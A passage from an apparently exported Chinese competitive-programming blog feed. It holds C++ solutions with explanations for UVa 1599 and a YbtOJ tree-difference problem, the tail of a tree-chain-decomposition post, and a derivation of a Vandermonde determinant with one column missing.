class="string">&quot;%d %d %lld&quot;</span>, &amp;u, &amp;v, &amp;w);</span><br><span class="line">            <span class="built_in">update</span>(&amp;nodes[u], &amp;nodes[v], w);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="type">int</span> u, v;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;u, &amp;v);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, <span class="built_in">query</span>(&amp;nodes[u], &amp;nodes[v]) % p);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="type">int</span> v;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> w;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %lld&quot;</span>, &amp;v, &amp;w);</span><br><span class="line">            segment-&gt;<span class="built_in">update</span>(nodes[v].dfn, nodes[v].dfn + nodes[v].size - <span class="number">1</span>, w);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="type">int</span> v;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, segment-&gt;<span class="built_in">query</span>(nodes[v].dfn, nodes[v].dfn + nodes[v].size - <span class="number">1</span>) % p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>学习笔记</tag>
        <tag>数据结构</tag>
        <tag>树</tag>
        <tag>线段树</tag>
        <tag>树链剖分</tag>
      </tags>
  </entry>
  <entry>
    <title>「UVa 1599」Ideal Path - 最短路 + BFS</title>
    <url>/uva-1599/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a
href="https://onlinejudge.org/index.php?option=com_onlinejudge&amp;Itemid=8&amp;category=448&amp;page=show_problem&amp;problem=4474">UVa
链接</a></p>
<p>给定一个 <span class="math inline">\(n\)</span> 个点 <span
class="math inline">\(m\)</span> 条边的无向图，每条边上都涂有 <span
class="math inline">\(1\)</span> 种颜色。求点 <span
class="math inline">\(1\)</span> 到点 <span
class="math inline">\(n\)</span>
的一条路径，使得经过的边数最少，在此前提下，经过边的颜色序列最小。可能有自环与重边。输入保证至少存在一条连接
<span class="math inline">\(1\)</span> 和 <span
class="math inline">\(n\)</span> 的道路。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>本题为求图论最短路，由于不需要考虑边权，可使用 BFS。</p>
<p>这道题在路径最短的情况下使得颜色所组成的字典序最小，可以分开解决。</p>
<p>首先解决最短路问题，求出所有的从 <span
class="math inline">\(1\)</span> 到 <span
class="math inline">\(n\)</span> 的最短路路径。这一步可通过记录从 <span
class="math inline">\(n\)</span> 到 <span
class="math inline">\(1\)</span> 可到达所有点的步数即可。利用该方法可从
<span class="math inline">\(1\)</span>
遍历可达路径，只要满足在记录中将达到的点的步数为之前的点的步数减一即为从
<span class="math inline">\(1\)</span> 到 <span
class="math inline">\(n\)</span> 的最短路或最短路的一部分，这一步可通过
BFS 解决，代码中对应的是 <code>bfsK</code> 函数。</p>
<p>接下来就要解决字典序最小。我们需要再一次使用 BFS
以求出在所有最短路中字典序最小的一条。由于最终长度相同，我们始终仅需选择字典序最小的节点。若两节点字典序相同，则都存入考虑范围。由于该次
BFS
无需进行队列弹出操作，且存入的节点同一层可能有多个，存储全部队列空间可能会爆，所以我们需要将队列改写滚动样式，仅存储最上层和次上层即可。代码中对应的是
<code>bfsCol</code> 函数。</p>
<p>注意在 <code>bfsCol</code>
函数中合理处理最短路步数的标记。同时注意应在全部字典序的节点都压入队列时再进行滚动操作。</p>
<h1 id="代码演示">代码演示</h1>
<p>这次 AC 代码有点丑，请见谅 ≧ ﹏ ≦</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;utility&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">100000</span>, INF = <span class="number">200000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line">std::vector&lt; std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &gt; e[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> vis[MAXN + <span class="number">1</span>], ans;</span><br><span class="line"><span class="type">int</span> col[INF + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bfsK</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">static</span> std::queue&lt; std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &gt; qK;</span><br><span class="line">    <span class="built_in">memset</span>(vis, <span class="number">-1</span>, <span class="built_in">sizeof</span>(vis));</span><br><span class="line">    qK.<span class="built_in">push</span>( std::<span class="built_in">make_pair</span>(n, <span class="number">0</span>) );</span><br><span class="line">    vis[n] = <span class="number">0</span>, ans = INF;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!qK.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        <span class="keyword">auto</span> u = qK.<span class="built_in">front</span>();</span><br><span class="line">        qK.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">if</span> (u.first == <span class="number">1</span> &amp;&amp; u.second &lt; ans) ans = u.second;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> ed : e[u.first]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (vis[ed.first] == <span class="number">-1</span>) &#123;</span><br><span class="line">                vis[ed.first] = u.second + <span class="number">1</span>;</span><br><span class="line">                qK.<span class="built_in">push</span>(std::<span class="built_in">make_pair</span>(ed.first, u.second + <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bfsCol</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">static</span> std::vector&lt;<span class="type">int</span>&gt; qCol;</span><br><span class="line">    <span class="type">static</span> <span class="type">bool</span> mk[MAXN + <span class="number">1</span>];  <span class="comment">// 此为已访问节点的标记</span></span><br><span class="line">    <span class="built_in">memset</span>(col, <span class="number">0x3f</span>, <span class="built_in">sizeof</span>(col));</span><br><span class="line">    <span class="built_in">memset</span>(mk, <span class="literal">false</span>, <span class="built_in">sizeof</span>(mk));</span><br><span class="line">    qCol.<span class="built_in">clear</span>();</span><br><span class="line">    qCol.<span class="built_in">push_back</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> cnt = ans - <span class="number">1</span>;</span><br><span class="line">    <span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">while</span> (cnt &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">static</span> std::vector&lt;<span class="type">int</span>&gt; uSet;</span><br><span class="line">        <span class="keyword">if</span> (flag) &#123;  <span class="comment">// 注意滚动的时机</span></span><br><span class="line">            uSet.<span class="built_in">clear</span>();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> each : qCol) uSet.<span class="built_in">push_back</span>(each);</span><br><span class="line">            qCol.<span class="built_in">clear</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> u : uSet) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> ed : e[u]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (vis[ed.first] == cnt) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!mk[ed.first]) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (col[cnt] &gt;= ed.second) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (col[cnt] &gt; ed.second) qCol.<span class="built_in">clear</span>();</span><br><span class="line">                            col[cnt] = ed.second;</span><br><span class="line">                            mk[ed.first] = <span class="literal">true</span>;</span><br><span class="line">                            flag = <span class="literal">false</span>;</span><br><span class="line">                            qCol.<span class="built_in">push_back</span>(ed.first);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (col[cnt] &gt; ed.second) col[cnt] = ed.second;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (flag) &#123;  <span class="comment">// 若无符合条件的节点，说明已遍历完。最短路步数加一。</span></span><br><span class="line">            cnt--;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> u : uSet) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">auto</span> ed : e[u]) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (vis[ed.first] == cnt) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (!mk[ed.first]) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (col[cnt] &gt;= ed.second) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (col[cnt] &gt; ed.second) qCol.<span class="built_in">clear</span>();</span><br><span class="line">                                col[cnt] = ed.second;</span><br><span class="line">                                mk[ed.first] = <span class="literal">true</span>;</span><br><span class="line">                                flag = <span class="literal">false</span>;</span><br><span class="line">                                qCol.<span class="built_in">push_back</span>(ed.first);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (col[cnt] &gt; ed.second) col[cnt] = ed.second;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (std::cin &gt;&gt; n &gt;&gt; m) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) e[i].<span class="built_in">clear</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, x, y, z; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;x, &amp;y, &amp;z);</span><br><span class="line">            <span class="keyword">if</span> (x == y) <span class="keyword">continue</span>;</span><br><span class="line">            e[x].<span class="built_in">push_back</span>( std::<span class="built_in">make_pair</span>(y, z) );</span><br><span class="line">            e[y].<span class="built_in">push_back</span>( std::<span class="built_in">make_pair</span>(x, z) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) std::<span class="built_in">sort</span>(e[i].<span class="built_in">begin</span>(), e[i].<span class="built_in">end</span>());</span><br><span class="line"></span><br><span class="line">        <span class="built_in">bfsK</span>();</span><br><span class="line">        <span class="built_in">bfsCol</span>();</span><br><span class="line"></span><br><span class="line">        std::cout &lt;&lt; ans &lt;&lt; std::endl;</span><br><span class="line">        <span class="comment">// UVA毒瘤！卡我输出格式！</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = ans - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) <span class="built_in">printf</span>(<span class="string">&quot;%d%c&quot;</span>, col[i], i == <span class="number">0</span> ? <span class="string">&#x27;\n&#x27;</span> : <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>图论</tag>
        <tag>最短路</tag>
        <tag>BFS</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>「高等代数」浅谈缺项 Vandermonde 行列式</title>
    <url>/vandermonde-determinant/</url>
    <content><![CDATA[<h1 id="前置知识">前置知识</h1>
<p>Vandermonde 行列式定义: 形如下列的行列式称为 Vandermonde 行列式.</p>
<p><span class="math display">\[
V_n = \begin{vmatrix}
1 &amp; 1 &amp; \cdots &amp; 1 \\
a_1 &amp; a_2 &amp; \cdots &amp; a_n \\
a_1^2 &amp; a_2^2 &amp; \cdots &amp; a_n^2 \\
\vdots &amp; \vdots &amp; &amp; \vdots \\
a_1^{n - 2} &amp; a_2^{n - 2} &amp; \cdots &amp; a_n^{n - 2} \\
a_1^{n - 1} &amp; a_2^{n - 1} &amp; \cdots &amp; a_n^{n - 1}
\end{vmatrix} = \prod\limits_{1 \le i &lt; j \le n}{(a_j - a_i)}
\]</span></p>
<span id="more"></span>
<p>证明可用经典的数学归纳法和隔行相消证明.</p>
<p>易证当 <span class="math inline">\(n = 2\)</span> 时成立. 设当 <span
class="math inline">\(n = k - 1\)</span> 时成立, 则 <span
class="math inline">\(n = k\)</span> 时:</p>
<p><span class="math display">\[
\begin{align*}
V_k &amp;= \begin{vmatrix}
1 &amp; 1 &amp; \cdots &amp; 1 \\
a_1 &amp; a_2 &amp; \cdots &amp; a_k \\
a_1^2 &amp; a_2^2 &amp; \cdots &amp; a_k^2 \\
\vdots &amp; \vdots &amp; &amp; \vdots \\
a_1^{k - 2} &amp; a_2^{k - 2} &amp; \cdots &amp; a_k^{k - 2} \\
a_1^{k - 1} &amp; a_2^{k - 1} &amp; \cdots &amp; a_k^{k - 1}
\end{vmatrix} \xlongequal[j = n, n - 1, \cdots, 2]{r_j - ar_{j - 1}}
\begin{vmatrix}
1 &amp; 1 &amp; \cdots &amp; 1 \\
0 &amp; a_2 - a_1 &amp; \cdots &amp; a_k - a_1 \\
0 &amp; (a_2 - a_1)a_2 &amp; \cdots &amp; (a_k - a_1)a_k \\
\vdots &amp; \vdots &amp; &amp; \vdots \\
0 &amp; (a_2 - a_1)a_2^{k - 3} &amp; \cdots &amp; (a_k - a_1)a_k^{k - 3}
\\
0 &amp; (a_2 - a_1)a_2^{k - 2} &amp; \cdots &amp; (a_k - a_1)a_k^{k - 2}
\end{vmatrix} \\
&amp;= (a_2 - a_1)(a_3 - a_1) \cdots (a_k - a_1) \begin{vmatrix}
1 &amp; 1 &amp; \cdots &amp; 1 \\
a_2 &amp; a_3 &amp; \cdots &amp; a_k \\
\vdots &amp; \vdots &amp; &amp; \vdots \\
a_2^{k - 2} &amp; a_3^{k - 2} &amp; \cdots &amp; a_k^{k - 2}
\end{vmatrix} = \prod\limits_{1 \le i &lt; j \le k}{(a_j - a_i)}
\end{align*}
\]</span></p>
<p>故 <span class="math inline">\(n = k\)</span> 成立.
由数学归纳法得证.</p>
<h1 id="缺项-vandermonde-行列式">缺项 Vandermonde 行列式</h1>
<p>例: 求下列 <span class="math inline">\(n\)</span> 阶行列式的值:</p>
<p><span class="math display">\[
\begin{vmatrix}
1 &amp; x_1 &amp; \cdots &amp; x_1^{k - 1} &amp; x_1^{k + 1} &amp;
\cdots &amp; x_1^n \\
1 &amp; x_2 &amp; \cdots &amp; x_2^{k - 1} &amp; x_2^{k + 1} &amp;
\cdots &amp; x_2^n \\
\vdots &amp; \vdots &amp; &amp; \vdots &amp; \vdots &amp; &amp; \vdots\\
1 &amp; x_{n - 1} &amp; \cdots &amp; x_{n - 1}^{k - 1} &amp; x_{n -
1}^{k + 1} &amp; \cdots &amp; x_{n - 1}^n \\
1 &amp; x_n &amp; \cdots &amp; x_n^{k - 1} &amp; x_n^{k + 1} &amp;
\cdots &amp; x_n^n
\end{vmatrix} (2 \le k \le n)
\]</span></p>
<p>可见该行列式可看作 Vandermonde 行列式缺了一列.</p>
<p>设上述行列式为 <span class="math inline">\(D\)</span>.
<strong>将其加边转化为 Vandermonde 行列式</strong>. 取行列式:</p>
<p><span class="math display">\[
V = \begin{vmatrix}
1 &amp; x_1 &amp; \cdots &amp; x_1^{k - 1} &amp; x_1^k &amp; x_1^{k + 1}
&amp; \cdots &amp; x_1^n \\
1 &amp; x_2 &amp; \cdots &amp; x_2^{k - 1} &amp; x_2^k &amp; x_2^{k + 1}
&amp; \cdots &amp; x_2^n \\
\vdots &amp; \vdots &amp; &amp; \vdots &amp; \vdots &amp; \vdots &amp;
&amp; \vdots\\
1 &amp; x_{n - 1} &amp; \cdots &amp; x_{n - 1}^{k - 1} &amp; x_{n - 1}^k
&amp; x_{n - 1}^{k + 1} &amp; \cdots &amp; x_{n - 1}^n \\
1 &amp; x_n &amp; \cdots &amp; x_n^{k - 1} &amp; x_n^k &amp; x_n^{k + 1}
&amp; \cdots &amp; x_n^n \\
1 &amp; y &amp; \cdots &amp; y^{k - 1} &amp; y^k &amp; y^{k + 1} &amp;
\cdots &amp; y^n
\end{vmatrix}
\]</span></p>
<p>对第 <span class="math inline">\(n + 1\)</span> 行展开, 有:</p>
<p><span class="math display">\[
V = (-1)^{n + 2} M_{1 \ n + 1} + (-1)^{n + 3} y M_{2 \ n + 1} + (-1)^{n
+ 4} y^2 M_{3 \ n + 1} + \cdots + (-1)^{2n + 2} y^n M_{n+1 \ n + 1}
\]</span></p>
<p>又有 <span class="math inline">\(M_{k \ n + 1} = D\)</span>. 即取
<span class="math inline">\(V\)</span> 中 <span
class="math inline">\(y^k\)</span> 的系数 <span class="math inline">\(X
= (-1)^{n + k + 2}M_{k \ n + 1} \Rightarrow D = (-1)^{n +
k}X\)</span>.</p>
<p>又由 Vandermonde 行列式得:</p>
<p><span class="math display">\[
V = \left[\prod\limits_{1 \le i \le j &lt; n}{(x_j -
x_i)}\right]\left[\prod\limits_{i = 1}^n{(y - x_i)}\right]
\]</span></p>
<p>故由排列组合得:</p>
<p><span class="math display">\[
X = \left[\prod\limits_{1 \le i \le j &lt; n}{(x_j -
x_i)}\right]\left(-1\right)^{n - k}\left(\sum\limits_{1 \le j_1 &lt; j_2
&lt; \cdots &lt; j_{n - k} \le n}{\prod\limits_{i = 1}^{n -
k}{x_{j_i}}}\right)
\]</span></p>
<p>故带入得:</p>
<p><span class="math display">\[
D = \left[\prod\limits_{1 \le i \le j &lt; n}{(x_j -
x_i)}\right]\left(\sum\limits_{1 \le j_1 &lt; j_2 &lt; \cdots &lt; j_{n
- k} \le n}{\prod\limits_{i = 1}^{n - k}{x_{j_i}}}\right)
\]</span></p>
]]></content>
      <categories>
        <category>数学</category>
        <category>一些想法</category>
      </categories>
      <tags>
        <tag>数学</tag>
        <tag>高等代数</tag>
        <tag>行列式</tag>
      </tags>
  </entry>
  <entry>
    <title>「YbtOJ CSP-S 模拟赛」砍苹果树 - 树上差分</title>
    <url>/ybtoj723-tee/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="http://noip.ybtoj.com.cn/contest/723/problem/1">YbtOJ
链接（需付费）</a></p>
<p>小 K 有一棵 <span class="math inline">\(n\)</span> 个点，<span
class="math inline">\(n - 1\)</span> 条边的苹果树，将树上的边称为 A
类边。</p>
<p>小 K 还往这棵树上加上了 <span class="math inline">\(m\)</span>
条边，称加上的边为 B 类边。</p>
<p>作为小 K 的好朋友，你想要砍掉小 K
的苹果树，但是你发现砍掉一条边不一定能使苹果树不连通，于是你需要求出：有多少选取
<strong>恰好一条 A 类边和恰好一条 B 类边</strong>
的方案，使得这两条边删去之后，原图不连通。</p>
<p>两种方案不同当且仅当一条边在第一种方案中被删除了但在第二种方案中没有被删除。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>我们可以使用类似于树形 DP 的思想考虑这个题。我们只使用 A
类边构成一颗树，显然我们可以发现，对于一条 A 类边 <span
class="math inline">\(u \rightarrow v\)</span>，对于以 <span
class="math inline">\(v\)</span> 为根的子树，该颗子树内有 <span
class="math inline">\(k\)</span> 条通往子树外的 B
类边，可分一下情况讨论：</p>
<ul>
<li><span class="math inline">\(k = 0\)</span>：显然删除 <span
class="math inline">\(u \rightarrow v\)</span> 与任意 B
类边均满足情况，答案增加 <span class="math inline">\(m\)</span>；</li>
<li><span class="math inline">\(k = 1\)</span>：显然删除 <span
class="math inline">\(u \rightarrow v\)</span> 与通往子树外的那一条 B
类边满足情况，答案增加 <span class="math inline">\(1\)</span>；</li>
<li><span class="math inline">\(k &gt; 1\)</span>：无解。</li>
</ul>
<p>于是我们可以用树上差分，对点统计向外连边的个数，然后 DFS
一遍即可。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">3e5</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> LOG_MAXN = <span class="number">19</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DBG</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    std::vector&lt;<span class="keyword">struct</span> Edge&gt; adj;</span><br><span class="line">    Node *f[LOG_MAXN + <span class="number">1</span>], *p;</span><br><span class="line">    <span class="type">int</span> d, cnt;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    Node *s, *t;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Edge</span>(Node *s, Node *t) : <span class="built_in">s</span>(s), <span class="built_in">t</span>(t) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">addEdge</span><span class="params">(Node *u, Node *v)</span> </span>&#123;</span><br><span class="line">    u-&gt;adj.<span class="built_in">push_back</span>(<span class="built_in">Edge</span>(u, v));</span><br><span class="line">    v-&gt;adj.<span class="built_in">push_back</span>(<span class="built_in">Edge</span>(v, u));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">prepare</span><span class="params">(Node *u, Node *f = <span class="literal">nullptr</span>)</span> </span>&#123;</span><br><span class="line">    u-&gt;f[<span class="number">0</span>] = u-&gt;p = f;</span><br><span class="line">    u-&gt;d = (f ? f-&gt;d : <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= LOG_MAXN; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (u-&gt;f[i - <span class="number">1</span>]) &#123;</span><br><span class="line">            u-&gt;f[i] = u-&gt;f[i - <span class="number">1</span>]-&gt;f[i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (Edge &amp;e : u-&gt;adj) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.t == f) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="built_in">prepare</span>(e.t, u);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> Node *<span class="title">lca</span><span class="params">(Node *u, Node *v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (u-&gt;d &lt; v-&gt;d) std::<span class="built_in">swap</span>(u, v);</span><br><span class="line">    <span class="keyword">if</span> (u-&gt;d != v-&gt;d) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = LOG_MAXN; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (u-&gt;f[i] &amp;&amp; u-&gt;f[i]-&gt;d &gt;= v-&gt;d) &#123;</span><br><span class="line">                u = u-&gt;f[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (u != v) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = LOG_MAXN; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (u-&gt;f[i] != v-&gt;f[i]) &#123;</span><br><span class="line">                u = u-&gt;f[i];</span><br><span class="line">                v = v-&gt;f[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> u-&gt;p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> u;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">dfs</span><span class="params">(Node *u, <span class="type">int</span> m, Node *f = <span class="literal">nullptr</span>)</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Edge &amp;e : u-&gt;adj) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.t == f) <span class="keyword">continue</span>;</span><br><span class="line">        ans += <span class="built_in">dfs</span>(e.t, m, u);</span><br><span class="line">        <span class="keyword">if</span> (e.t-&gt;cnt == <span class="number">0</span>) ans += m;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (e.t-&gt;cnt == <span class="number">1</span>) ans++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (u-&gt;p) u-&gt;p-&gt;cnt += u-&gt;cnt;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DBG</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[%d]: %lld %d\n&quot;</span>, u-&gt;id, ans, u-&gt;cnt);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">freopen</span>(<span class="string">&quot;tree.in&quot;</span>, <span class="string">&quot;r&quot;</span>, stdin);</span><br><span class="line">    <span class="built_in">freopen</span>(<span class="string">&quot;tree.out&quot;</span>, <span class="string">&quot;w&quot;</span>, stdout);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line"></span><br><span class="line">    <span class="function">std::vector&lt;Node&gt; <span class="title">nodes</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DBG</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) nodes[i].id = i;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> u, v;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;u, &amp;v);</span><br><span class="line">        <span class="built_in">addEdge</span>(&amp;nodes[u], &amp;nodes[v]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">prepare</span>(&amp;nodes[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        <span class="type">int</span> a, b;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">        Node *u = &amp;nodes[a], *v = &amp;nodes[b];</span><br><span class="line">        Node *f = <span class="built_in">lca</span>(u, v);</span><br><span class="line">        u-&gt;cnt++, v-&gt;cnt++, f-&gt;cnt -= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DBG</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= 